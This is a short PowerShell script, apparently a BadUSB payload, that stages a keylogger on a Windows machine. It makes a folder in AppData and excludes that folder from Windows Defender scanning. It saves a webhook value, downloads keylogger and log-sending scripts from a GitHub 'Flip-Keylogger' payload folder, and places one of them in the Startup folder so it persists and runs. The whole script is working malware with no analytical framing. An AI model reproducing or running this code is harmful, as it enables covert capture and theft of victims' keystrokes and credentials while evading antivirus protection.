if (![System.IO.Directory]::Exists("$env:appdata\-locker")){New-Item -ItemType Directory -Force -Path "$env:appdata\-locker"}

Add-MpPreference -ExclusionPath $env:appdata/-locker

echo $dc > "$env:appdata\-locker\wh.txt"

iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-p.cmd     -o "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-keys.ps1  -o "$env:appdata\-locker\-keys.ps1" 
iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-logs.ps1  -o "$env:appdata\-locker\-logs.ps1"

start-process "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
